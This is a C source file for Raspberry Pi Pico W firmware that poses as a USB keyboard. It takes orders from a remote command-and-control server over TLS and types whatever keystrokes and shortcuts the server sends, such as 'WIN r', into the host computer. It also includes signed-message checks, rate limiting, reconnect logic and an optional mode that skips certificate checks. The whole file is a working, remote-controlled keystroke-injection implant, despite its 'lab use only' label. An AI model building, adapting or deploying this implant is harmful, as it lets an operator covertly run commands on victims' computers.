/**
 * main.c — Pico W C2 HID Agent
 * Educational / lab use only.
 *
 * Architecture:
 *   Core 0 → Wi-Fi + mbedTLS TCP client + C2 protocol loop
 *   Core 1 → TinyUSB device stack (HID keyboard)
 *
 * The two cores communicate through a lock-free single-producer /
 * single-consumer ring buffer (hid_ring).  Core 0 enqueues keystroke
 * records; Core 1 dequeues them and feeds TinyUSB.
 *
 * Security properties preserved from the desktop agent:
 *   [SEC-1] No env-dump command — RUNNER_TOKEN / RUNNER_HMAC_SECRET
 *           never leave the device.
 *   [SEC-3] Constant-time token comparison via mbedtls_ct_memcmp().
 *   [SEC-4] TLS 1.3 with CA cert baked into flash (see ca_cert.h).
 *           Lab bypass: define AGENT_LAB_MODE=1 in CMake to skip
 *           verification (never in production).
 *   [OPS-1] Rate limiting — 30 keystroke-payloads / minute.
 *   [OPS-4] Watchdog + graceful shutdown on "terminate" action.
 *
 * Limitations vs desktop version (hardware constraints):
 *   - No fork/exec — keystroke injection IS the only "exec".
 *   - No path sanitisation needed (no filesystem access exposed).
 *   - 264 KB RAM (RP2040) / 520 KB (RP2350): mbedTLS heap must be
 *     kept lean; see MBEDTLS_CONFIG_FILE = "mbedtls_config.h".
 *
 * Dependencies (all pulled by pico-sdk / CMake):
 *   pico-sdk >= 1.5.1
 *   pico_cyw43_arch_lwip_threadsafe_background
 *   tinyusb_device (bundled in pico-sdk)
 *   mbedtls (bundled in pico-sdk)
 *
 * Build:
 *   mkdir build && cd build
 *   cmake -DPICO_BOARD=pico_w ..        # or pico2_w for RP2350
 *   make -j4
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

/* ── Pico SDK ─────────────────────────────────────────────────────── */
#include "pico/stdlib.h"
#include "pico/multicore.h"
#include "pico/mutex.h"
#include "pico/time.h"
#include "hardware/watchdog.h"

/* ── Wi-Fi (CYW43) ───────────────────────────────────────────────── */
#include "pico/cyw43_arch.h"
#include "lwip/tcp.h"
#include "lwip/dns.h"

/* ── TinyUSB ─────────────────────────────────────────────────────── */
#include "tusb.h"
#include "usb_descriptors.h"   /* generated — see usb_descriptors.c  */

/* ── mbedTLS ─────────────────────────────────────────────────────── */
#include "mbedtls/ssl.h"
#include "mbedtls/net_sockets.h"
#include "mbedtls/entropy.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/error.h"
#include "mbedtls/x509_crt.h"
#include "mbedtls/constant_time.h"  /* mbedtls_ct_memcmp */

/* ── JSON (tiny embedded parser — no heap alloc) ─────────────────── */
#include "jsmn.h"   /* single-header: https://github.com/zserge/jsmn */

/* ── Project headers ─────────────────────────────────────────────── */
#include "agent_config.h"   /* WIFI_SSID, WIFI_PASS, C2_HOST, C2_PORT,
                               RUNNER_TOKEN, RUNNER_HMAC_SECRET        */
#include "ca_cert.h"        /* const char ca_cert_pem[]               */

/* ═══════════════════════════════════════════════════════════════════
 * §1  HID keystroke ring buffer  (Core 0 writes, Core 1 reads)
 * ═══════════════════════════════════════════════════════════════════ */

#define RING_CAP 64   /* max queued keystroke records                  */

typedef struct {
    uint8_t modifier;   /* HID modifier byte (SHIFT, CTRL, ALT …)     */
    uint8_t keycode;    /* HID usage ID                                */
    uint16_t delay_ms;  /* pause AFTER this key is released            */
} hid_key_t;

static hid_key_t  hid_ring[RING_CAP];
static volatile uint32_t ring_head = 0;   /* written by Core 0        */
static volatile uint32_t ring_tail = 0;   /* read    by Core 1        */

/* Returns false if ring is full */
static bool ring_push(hid_key_t k) {
    uint32_t next = (ring_head + 1) % RING_CAP;
    if (next == ring_tail) return false;   /* full                     */
    hid_ring[ring_head] = k;
    __dmb();                               /* memory barrier           */
    ring_head = next;
    return true;
}

/* Returns false if ring is empty */
static bool ring_pop(hid_key_t *out) {
    if (ring_tail == ring_head) return false;
    *out = hid_ring[ring_tail];
    __dmb();
    ring_tail = (ring_tail + 1) % RING_CAP;
    return true;
}

/* ═══════════════════════════════════════════════════════════════════
 * §2  HID keycode helpers
 * ═══════════════════════════════════════════════════════════════════ */

/* US-QWERTY layout lookup — returns {modifier, keycode} for printable ASCII */
static hid_key_t ascii_to_hid(char c) {
    /* Letters */
    if (c >= 'a' && c <= 'z') return (hid_key_t){0,    (uint8_t)(HID_KEY_A + c - 'a'), 0};
    if (c >= 'A' && c <= 'Z') return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT,
                                                  (uint8_t)(HID_KEY_A + c - 'A'), 0};
    /* Digits */
    if (c >= '1' && c <= '9') return (hid_key_t){0,    (uint8_t)(HID_KEY_1 + c - '1'), 0};
    if (c == '0')              return (hid_key_t){0,    HID_KEY_0, 0};

    /* Common punctuation (US layout) */
    switch (c) {
    case ' ':  return (hid_key_t){0,                         HID_KEY_SPACE,        0};
    case '\n': return (hid_key_t){0,                         HID_KEY_ENTER,        0};
    case '\t': return (hid_key_t){0,                         HID_KEY_TAB,          0};
    case '-':  return (hid_key_t){0,                         HID_KEY_MINUS,        0};
    case '=':  return (hid_key_t){0,                         HID_KEY_EQUAL,        0};
    case '[':  return (hid_key_t){0,                         HID_KEY_BRACKET_LEFT, 0};
    case ']':  return (hid_key_t){0,                         HID_KEY_BRACKET_RIGHT,0};
    case '\\': return (hid_key_t){0,                         HID_KEY_BACKSLASH,    0};
    case ';':  return (hid_key_t){0,                         HID_KEY_SEMICOLON,    0};
    case '\'': return (hid_key_t){0,                         HID_KEY_APOSTROPHE,   0};
    case '`':  return (hid_key_t){0,                         HID_KEY_GRAVE,        0};
    case ',':  return (hid_key_t){0,                         HID_KEY_COMMA,        0};
    case '.':  return (hid_key_t){0,                         HID_KEY_PERIOD,       0};
    case '/':  return (hid_key_t){0,                         HID_KEY_SLASH,        0};
    /* Shifted punctuation */
    case '!':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_1,          0};
    case '@':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_2,          0};
    case '#':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_3,          0};
    case '$':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_4,          0};
    case '%':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_5,          0};
    case '^':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_6,          0};
    case '&':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_7,          0};
    case '*':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_8,          0};
    case '(':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_9,          0};
    case ')':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_0,          0};
    case '_':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_MINUS,      0};
    case '+':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_EQUAL,      0};
    case '{':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_BRACKET_LEFT,  0};
    case '}':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_BRACKET_RIGHT, 0};
    case '|':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_BACKSLASH,  0};
    case ':':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_SEMICOLON,  0};
    case '"':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_APOSTROPHE, 0};
    case '<':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_COMMA,      0};
    case '>':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_PERIOD,     0};
    case '?':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_SLASH,      0};
    case '~':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_GRAVE,      0};
    default:   return (hid_key_t){0, 0, 0};  /* unsupported — skip    */
    }
}

/* Enqueue an entire string as individual keystrokes */
static void enqueue_string(const char *s, uint16_t inter_key_ms) {
    for (; *s; ++s) {
        hid_key_t k = ascii_to_hid(*s);
        if (k.keycode == 0 && *s != ' ') continue;
        k.delay_ms = inter_key_ms;
        /* Spin-wait if ring is full (Core 1 will drain it) */
        while (!ring_push(k)) tight_loop_contents();
    }
}

/* Enqueue a special key with optional modifier (e.g. WIN, GUI) */
static void enqueue_special(uint8_t modifier, uint8_t keycode, uint16_t delay_ms) {
    hid_key_t k = {modifier, keycode, delay_ms};
    while (!ring_push(k)) tight_loop_contents();
}

/* ═══════════════════════════════════════════════════════════════════
 * §3  Core 1 — TinyUSB HID task
 * ═══════════════════════════════════════════════════════════════════ */

static void core1_entry(void) {
    tusb_init();

    hid_key_t pending  = {0, 0, 0};
    bool       pressing = false;  /* true while key is held down      */
    uint32_t   release_at = 0;   /* time_us_32() to release           */

    for (;;) {
        tud_task();   /* TinyUSB main task — must be called frequently */

        if (!tud_hid_ready()) continue;

        if (pressing) {
            /* Key is being held — release it after 8 ms */
            if (time_us_32() >= release_at) {
                tud_hid_keyboard_report(REPORT_ID_KEYBOARD, 0, NULL);
                pressing = false;
                if (pending.delay_ms)
                    sleep_ms(pending.delay_ms);
            }
            continue;
        }

        hid_key_t k;
        if (!ring_pop(&k)) continue;   /* nothing to inject           */

        pending = k;
        uint8_t keycodes[6] = {k.keycode, 0, 0, 0, 0, 0};
        tud_hid_keyboard_report(REPORT_ID_KEYBOARD, k.modifier, keycodes);
        pressing   = true;
        release_at = time_us_32() + 8000;   /* 8 ms press duration    */
    }
}

/* TinyUSB callbacks (must exist even if empty) */
void tud_hid_report_complete_cb(uint8_t instance, uint8_t const *report, uint16_t len) {
    (void)instance; (void)report; (void)len;
}
uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id,
                                hid_report_type_t type, uint8_t *buf, uint16_t len) {
    (void)instance; (void)report_id; (void)type; (void)buf;
    return len;
}
void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id,
                            hid_report_type_t type, uint8_t const *buf, uint16_t len) {
    (void)instance; (void)report_id; (void)type; (void)buf; (void)len;
}

/* ═══════════════════════════════════════════════════════════════════
 * §4  Rate limiter  (OPS-1 — 30 payloads / minute)
 * ═══════════════════════════════════════════════════════════════════ */

#define RATE_LIMIT   30
#define RATE_WINDOW  60000  /* ms */

static uint32_t rate_ts[RATE_LIMIT];
static int      rate_count = 0;

static bool rate_allow(void) {
    uint32_t now    = to_ms_since_boot(get_absolute_time());
    uint32_t cutoff = now - RATE_WINDOW;

    /* Evict old timestamps */
    int i, j = 0;
    for (i = 0; i < rate_count; i++)
        if (rate_ts[i] >= cutoff) rate_ts[j++] = rate_ts[i];
    rate_count = j;

    if (rate_count >= RATE_LIMIT) return false;
    rate_ts[rate_count++] = now;
    return true;
}

/* ═══════════════════════════════════════════════════════════════════
 * §5  Crypto — HMAC-SHA256 via mbedTLS + constant-time compare
 * ═══════════════════════════════════════════════════════════════════ */

#include "mbedtls/md.h"

static void hmac_sha256_hex(const char *secret, size_t slen,
                             const char *msg,    size_t mlen,
                             char        out[65]) {
    uint8_t digest[32];
    mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256),
                    (const uint8_t *)secret, slen,
                    (const uint8_t *)msg,    mlen,
                    digest);
    for (int i = 0; i < 32; i++)
        snprintf(out + i * 2, 3, "%02x", digest[i]);
    out[64] = '\0';
}

/* [SEC-3] Constant-time compare via mbedTLS */
static bool ct_equal(const char *a, const char *b, size_t len) {
    return mbedtls_ct_memcmp(a, b, len) == 0;
}

/* ═══════════════════════════════════════════════════════════════════
 * §6  Minimal JSON helpers (jsmn-based, no heap)
 * ═══════════════════════════════════════════════════════════════════ */

#define MAX_TOKENS 64

static bool json_eq(const char *js, jsmntok_t *t, const char *s) {
    size_t len = strlen(s);
    return (size_t)(t->end - t->start) == len &&
           memcmp(js + t->start, s, len) == 0;
}

/* Extract string value for a given key into buf (NUL-terminated).
 * Returns false if key not found or value too long for buf. */
static bool json_get_str(const char *js, jsmntok_t *toks, int cnt,
                          const char *key, char *buf, size_t bufsz) {
    for (int i = 1; i < cnt - 1; i++) {
        if (toks[i].type == JSMN_STRING && json_eq(js, &toks[i], key) &&
            toks[i + 1].type == JSMN_STRING) {
            size_t vlen = (size_t)(toks[i + 1].end - toks[i + 1].start);
            if (vlen >= bufsz) return false;
            memcpy(buf, js + toks[i + 1].start, vlen);
            buf[vlen] = '\0';
            return true;
        }
    }
    return false;
}

/* ═══════════════════════════════════════════════════════════════════
 * §7  TLS connection (mbedTLS over lwIP raw TCP via net_sockets)
 * ═══════════════════════════════════════════════════════════════════ */

typedef struct {
    mbedtls_ssl_context      ssl;
    mbedtls_ssl_config       conf;
    mbedtls_net_context      net;
    mbedtls_x509_crt         cacert;
    mbedtls_entropy_context  entropy;
    mbedtls_ctr_drbg_context drbg;
    bool                     connected;
} tls_ctx_t;

static void tls_ctx_init(tls_ctx_t *ctx) {
    mbedtls_ssl_init(&ctx->ssl);
    mbedtls_ssl_config_init(&ctx->conf);
    mbedtls_net_init(&ctx->net);
    mbedtls_x509_crt_init(&ctx->cacert);
    mbedtls_entropy_init(&ctx->entropy);
    mbedtls_ctr_drbg_init(&ctx->drbg);
    ctx->connected = false;
}

static void tls_ctx_free(tls_ctx_t *ctx) {
    mbedtls_ssl_close_notify(&ctx->ssl);
    mbedtls_net_free(&ctx->net);
    mbedtls_ssl_free(&ctx->ssl);
    mbedtls_ssl_config_free(&ctx->conf);
    mbedtls_x509_crt_free(&ctx->cacert);
    mbedtls_ctr_drbg_free(&ctx->drbg);
    mbedtls_entropy_free(&ctx->entropy);
    ctx->connected = false;
}

static bool tls_connect(tls_ctx_t *ctx, const char *host, const char *port) {
    int ret;

    ret = mbedtls_ctr_drbg_seed(&ctx->drbg, mbedtls_entropy_func,
                                  &ctx->entropy, NULL, 0);
    if (ret) { printf("[TLS] drbg seed: -0x%04x\n", (unsigned)-ret); return false; }

#ifdef AGENT_LAB_MODE
    printf("[WARN] TLS cert verification OFF — lab mode\n");
    mbedtls_ssl_config_defaults(&ctx->conf, MBEDTLS_SSL_IS_CLIENT,
                                  MBEDTLS_SSL_TRANSPORT_STREAM,
                                  MBEDTLS_SSL_PRESET_DEFAULT);
    mbedtls_ssl_conf_authmode(&ctx->conf, MBEDTLS_SSL_VERIFY_NONE);
#else
    /* [SEC-4] Load CA cert baked into flash */
    ret = mbedtls_x509_crt_parse(&ctx->cacert,
                                   (const uint8_t *)ca_cert_pem,
                                   strlen(ca_cert_pem) + 1);
    if (ret) { printf("[TLS] ca parse: -0x%04x\n", (unsigned)-ret); return false; }

    mbedtls_ssl_config_defaults(&ctx->conf, MBEDTLS_SSL_IS_CLIENT,
                                  MBEDTLS_SSL_TRANSPORT_STREAM,
                                  MBEDTLS_SSL_PRESET_DEFAULT);
    mbedtls_ssl_conf_authmode(&ctx->conf, MBEDTLS_SSL_VERIFY_REQUIRED);
    mbedtls_ssl_conf_ca_chain(&ctx->conf, &ctx->cacert, NULL);
#endif

    /* [SEC-4] Minimum TLS 1.3 */
    mbedtls_ssl_conf_min_tls_version(&ctx->conf, MBEDTLS_SSL_VERSION_TLS1_3);
    mbedtls_ssl_conf_rng(&ctx->conf, mbedtls_ctr_drbg_random, &ctx->drbg);

    ret = mbedtls_ssl_setup(&ctx->ssl, &ctx->conf);
    if (ret) { printf("[TLS] setup: -0x%04x\n", (unsigned)-ret); return false; }

    ret = mbedtls_ssl_set_hostname(&ctx->ssl, host);
    if (ret) { printf("[TLS] set_hostname: -0x%04x\n", (unsigned)-ret); return false; }

    ret = mbedtls_net_connect(&ctx->net, host, port, MBEDTLS_NET_PROTO_TCP);
    if (ret) { printf("[TLS] connect: -0x%04x\n", (unsigned)-ret); return false; }

    mbedtls_ssl_set_bio(&ctx->ssl, &ctx->net,
                         mbedtls_net_send, mbedtls_net_recv, NULL);

    while ((ret = mbedtls_ssl_handshake(&ctx->ssl)) != 0) {
        if (ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE) {
            printf("[TLS] handshake: -0x%04x\n", (unsigned)-ret);
            return false;
        }
    }
    ctx->connected = true;
    printf("[TLS] connected to %s:%s\n", host, port);
    return true;
}

/* Send a NUL-terminated string + newline */
static bool tls_send_line(tls_ctx_t *ctx, const char *line) {
    size_t len = strlen(line);
    size_t sent = 0;
    while (sent < len) {
        int n = mbedtls_ssl_write(&ctx->ssl,
                                   (const uint8_t *)line + sent,
                                   len - sent);
        if (n <= 0) return false;
        sent += (size_t)n;
    }
    /* send the newline */
    unsigned char nl = '\n';
    return mbedtls_ssl_write(&ctx->ssl, &nl, 1) == 1;
}

#define RECV_BUF_SZ 2048

/* Read one newline-terminated line into buf.
 * Returns false on error or buffer overflow. */
static bool tls_recv_line(tls_ctx_t *ctx, char *buf, size_t bufsz) {
    size_t pos = 0;
    while (pos < bufsz - 1) {
        unsigned char c;
        int n = mbedtls_ssl_read(&ctx->ssl, &c, 1);
        if (n == MBEDTLS_ERR_SSL_WANT_READ) continue;
        if (n <= 0) return false;
        if (c == '\r') continue;
        if (c == '\n') { buf[pos] = '\0'; return true; }
        buf[pos++] = (char)c;
    }
    return false;   /* overflow */
}

/* ═══════════════════════════════════════════════════════════════════
 * §8  Protocol — JSON envelope with HMAC-SHA256
 * ═══════════════════════════════════════════════════════════════════ */

/* Static send buffer (no heap) */
static char s_send_buf[1024];
static char s_recv_buf[RECV_BUF_SZ];

/* Build {"body":"<body>","sig":"<hmac>"}\n and send */
static bool proto_send(tls_ctx_t *ctx, const char *body) {
    char sig[65] = "";
    if (RUNNER_HMAC_SECRET[0]) {
        hmac_sha256_hex(RUNNER_HMAC_SECRET, strlen(RUNNER_HMAC_SECRET),
                        body, strlen(body), sig);
    }
    /* Minimal JSON serialisation — body must not contain '"' unescaped */
    snprintf(s_send_buf, sizeof(s_send_buf),
             "{\"body\":\"%s\",\"sig\":\"%s\"}", body, sig);
    return tls_send_line(ctx, s_send_buf);
}

typedef struct {
    char action[32];
    char payload[512];   /* raw "text" / "keys" field value            */
    char token[128];
    char error[128];
} parsed_msg_t;

/* Receive one envelope, verify HMAC, extract fields.
 * Returns false on connection error.
 * Sets msg->action = "invalid" on HMAC failure. */
static bool proto_recv(tls_ctx_t *ctx, parsed_msg_t *msg) {
    memset(msg, 0, sizeof(*msg));

    if (!tls_recv_line(ctx, s_recv_buf, sizeof(s_recv_buf))) return false;

    /* Parse outer envelope: {"body":"...","sig":"..."} */
    jsmn_parser p; jsmntok_t toks[MAX_TOKENS];
    jsmn_init(&p);
    int cnt = jsmn_parse(&p, s_recv_buf, strlen(s_recv_buf), toks, MAX_TOKENS);
    if (cnt < 1 || toks[0].type != JSMN_OBJECT) {
        strncpy(msg->action, "invalid", sizeof(msg->action));
        return true;
    }

    char body[512], sig_recv[65];
    if (!json_get_str(s_recv_buf, toks, cnt, "body", body, sizeof(body))) {
        strncpy(msg->action, "invalid", sizeof(msg->action));
        return true;
    }
    json_get_str(s_recv_buf, toks, cnt, "sig", sig_recv, sizeof(sig_recv));

    /* [SEC-3] Verify HMAC before processing body */
    if (RUNNER_HMAC_SECRET[0]) {
        char sig_calc[65];
        hmac_sha256_hex(RUNNER_HMAC_SECRET, strlen(RUNNER_HMAC_SECRET),
                        body, strlen(body), sig_calc);
        if (!ct_equal(sig_calc, sig_recv, 64)) {
            strncpy(msg->action, "invalid", sizeof(msg->action));
            return true;
        }
    }

    /* Parse inner body JSON */
    jsmn_init(&p);
    cnt = jsmn_parse(&p, body, strlen(body), toks, MAX_TOKENS);
    if (cnt < 1) { strncpy(msg->action, "invalid", sizeof(msg->action)); return true; }

    json_get_str(body, toks, cnt, "action",  msg->action,  sizeof(msg->action));
    json_get_str(body, toks, cnt, "text",    msg->payload, sizeof(msg->payload));
    json_get_str(body, toks, cnt, "keys",    msg->payload, sizeof(msg->payload));
    json_get_str(body, toks, cnt, "token",   msg->token,   sizeof(msg->token));

    return true;
}

/* ═══════════════════════════════════════════════════════════════════
 * §9  Payload executor
 *
 * The server sends one of:
 *   {"action":"type",    "text":"Hello World\n"}
 *       → inject text string character by character
 *
 *   {"action":"key",     "keys":"WIN r"}
 *       → inject a special key combo  (modifier+key pairs)
 *         Supported modifiers: CTRL, SHIFT, ALT, WIN/GUI
 *         Supported keys: any single char, or named keys
 *         (ENTER, TAB, ESC, F1-F12, UP, DOWN, LEFT, RIGHT, DEL, HOME)
 *         Example: "CTRL ALT DEL", "WIN r", "SHIFT F10"
 *
 *   {"action":"delay",   "text":"500"}
 *       → sleep N milliseconds (max 5000)
 * ═══════════════════════════════════════════════════════════════════ */

/* Named-key lookup (subset of HID usage table) */
typedef struct { const char *name; uint8_t keycode; } named_key_t;
static const named_key_t named_keys[] = {
    {"ENTER",  HID_KEY_ENTER},    {"ESC",    HID_KEY_ESCAPE},
    {"TAB",    HID_KEY_TAB},      {"SPACE",  HID_KEY_SPACE},
    {"DEL",    HID_KEY_DELETE},   {"BACKSPACE", HID_KEY_BACKSPACE},
    {"HOME",   HID_KEY_HOME},     {"END",    HID_KEY_END},
    {"PGUP",   HID_KEY_PAGE_UP},  {"PGDN",   HID_KEY_PAGE_DOWN},
    {"UP",     HID_KEY_ARROW_UP}, {"DOWN",   HID_KEY_ARROW_DOWN},
    {"LEFT",   HID_KEY_ARROW_LEFT},{"RIGHT", HID_KEY_ARROW_RIGHT},
    {"F1",  HID_KEY_F1},  {"F2",  HID_KEY_F2},  {"F3",  HID_KEY_F3},
    {"F4",  HID_KEY_F4},  {"F5",  HID_KEY_F5},  {"F6",  HID_KEY_F6},
    {"F7",  HID_KEY_F7},  {"F8",  HID_KEY_F8},  {"F9",  HID_KEY_F9},
    {"F10", HID_KEY_F10}, {"F11", HID_KEY_F11}, {"F12", HID_KEY_F12},
    {NULL, 0}
};

/* Parse "WIN r" / "CTRL ALT DEL" / "F5" etc. and enqueue */
static void enqueue_key_combo(const char *spec) {
    char buf[64]; strncpy(buf, spec, sizeof(buf)-1); buf[sizeof(buf)-1] = '\0';

    uint8_t modifier = 0;
    uint8_t keycode  = 0;
    char   *token    = strtok(buf, " ");

    while (token) {
        /* Modifier tokens */
        if (!strcmp(token,"CTRL") || !strcmp(token,"CONTROL"))
            { modifier |= KEYBOARD_MODIFIER_LEFTCTRL;  token = strtok(NULL," "); continue; }
        if (!strcmp(token,"SHIFT"))
            { modifier |= KEYBOARD_MODIFIER_LEFTSHIFT; token = strtok(NULL," "); continue; }
        if (!strcmp(token,"ALT"))
            { modifier |= KEYBOARD_MODIFIER_LEFTALT;   token = strtok(NULL," "); continue; }
        if (!strcmp(token,"WIN") || !strcmp(token,"GUI"))
            { modifier |= KEYBOARD_MODIFIER_LEFTGUI;   token = strtok(NULL," "); continue; }

        /* Named key */
        bool found = false;
        for (int i = 0; named_keys[i].name; i++) {
            if (!strcmp(token, named_keys[i].name)) {
                keycode = named_keys[i].keycode; found = true; break;
            }
        }
        /* Single-character key */
        if (!found && strlen(token) == 1) {
            hid_key_t k = ascii_to_hid(token[0]);
            keycode   = k.keycode;
            modifier |= k.modifier;
        }
        token = strtok(NULL, " ");
    }

    if (keycode) enqueue_special(modifier, keycode, 80);
}

static void run_payload(const parsed_msg_t *msg) {
    if (!strcmp(msg->action, "type")) {
        enqueue_string(msg->payload, 20);   /* 20 ms between keys      */

    } else if (!strcmp(msg->action, "key")) {
        enqueue_key_combo(msg->payload);

    } else if (!strcmp(msg->action, "delay")) {
        uint32_t ms = (uint32_t)atoi(msg->payload);
        if (ms > 5000) ms = 5000;           /* cap at 5 s              */
        sleep_ms(ms);
    }
}

/* ═══════════════════════════════════════════════════════════════════
 * §10  Session handler (Core 0)
 * ═══════════════════════════════════════════════════════════════════ */

static char port_str[8];

static void run_session(void) {
    tls_ctx_t ctx;
    tls_ctx_init(&ctx);

    snprintf(port_str, sizeof(port_str), "%d", C2_PORT);
    if (!tls_connect(&ctx, C2_HOST, port_str)) {
        tls_ctx_free(&ctx);
        return;
    }

    bool auth = false;

    /* Send initial auth */
    char auth_body[256];
    snprintf(auth_body, sizeof(auth_body),
             "{\"action\":\"auth\",\"token\":\"%s\"}", RUNNER_TOKEN);
    proto_send(&ctx, auth_body);

    for (;;) {
        parsed_msg_t msg;
        if (!proto_recv(&ctx, &msg)) {
            printf("[C2] disconnected\n");
            break;
        }

        /* [SEC-3] Validate HMAC — disconnect on tampered message */
        if (!strcmp(msg.action, "invalid")) {
            printf("[C2] dropping: invalid envelope or HMAC\n");
            break;
        }

        /* Pre-auth: only "ping" and server's auth-ack pass through */
        if (!auth) {
            if (!strcmp(msg.action, "ok") || !strcmp(msg.action, "pong")) {
                auth = true;
                printf("[C2] authenticated\n");
                continue;
            }
            /* Anything else before auth-ack — disconnect */
            printf("[C2] unexpected pre-auth action: %s\n", msg.action);
            break;
        }

        if (!strcmp(msg.action, "ping")) {
            proto_send(&ctx, "{\"action\":\"pong\",\"ok\":true}");
            continue;
        }

        if (!strcmp(msg.action, "type") ||
            !strcmp(msg.action, "key")  ||
            !strcmp(msg.action, "delay")) {

            /* [OPS-1] Rate limit */
            if (!rate_allow()) {
                proto_send(&ctx, "{\"ok\":false,\"error\":\"rate limit exceeded\"}");
                continue;
            }
            run_payload(&msg);
            proto_send(&ctx, "{\"ok\":true}");
            continue;
        }

        if (!strcmp(msg.action, "exit")) {
            proto_send(&ctx, "{\"ok\":true,\"message\":\"bye\"}");
            break;
        }

        if (!strcmp(msg.action, "terminate")) {
            proto_send(&ctx, "{\"ok\":true,\"message\":\"terminating\"}");
            printf("[C2] terminate — rebooting\n");
            tls_ctx_free(&ctx);
            watchdog_reboot(0, 0, 0);
            return;
        }

        /* Unknown action */
        char err[128];
        snprintf(err, sizeof(err), "{\"ok\":false,\"error\":\"unknown action: %s\"}",
                 msg.action);
        proto_send(&ctx, err);
    }

    tls_ctx_free(&ctx);
}

/* ═══════════════════════════════════════════════════════════════════
 * §11  Main — Core 0 (Wi-Fi + C2 loop)
 * ═══════════════════════════════════════════════════════════════════ */

int main(void) {
    stdio_init_all();
    sleep_ms(2000);   /* wait for USB enumeration after flash          */

    printf("[BOOT] Pico W C2 HID Agent\n");
    printf("[BOOT] board: " PICO_BOARD "\n");

    /* Start Core 1 (TinyUSB HID) before touching Wi-Fi */
    multicore_launch_core1(core1_entry);
    sleep_ms(500);

    /* Initialise CYW43 Wi-Fi */
    if (cyw43_arch_init()) {
        printf("[WiFi] init failed\n");
        return 1;
    }
    cyw43_arch_enable_sta_mode();

    printf("[WiFi] connecting to '%s'...\n", WIFI_SSID);
    int wifi_ret = cyw43_arch_wifi_connect_timeout_ms(
        WIFI_SSID, WIFI_PASS, CYW43_AUTH_WPA2_AES_PSK, 30000);
    if (wifi_ret) {
        printf("[WiFi] connect failed: %d\n", wifi_ret);
        return 1;
    }
    printf("[WiFi] connected, IP: %s\n",
           ip4addr_ntoa(netif_ip4_addr(netif_default)));

    /* LED on = online */
    cyw43_arch_gpio_put(CYW43_WL_GPIO_LED_PIN, 1);

    /* Jittered exponential backoff reconnect loop */
    uint32_t backoff_ms = 1000;
    for (;;) {
        printf("[C2] connecting to %s:%d\n", C2_HOST, C2_PORT);
        run_session();

        /* Blink LED while disconnected */
        cyw43_arch_gpio_put(CYW43_WL_GPIO_LED_PIN, 0);
        printf("[C2] retry in %lu ms\n", (unsigned long)backoff_ms);
        sleep_ms(backoff_ms);
        cyw43_arch_gpio_put(CYW43_WL_GPIO_LED_PIN, 1);

        /* Double backoff up to 60 s with ±20 % jitter */
        backoff_ms = backoff_ms < 30000 ? backoff_ms * 2 : 60000;
        uint32_t jitter = backoff_ms / 5;   /* 20 % */
        backoff_ms += (get_rand_32() % (jitter * 2)) - jitter;
    }
}
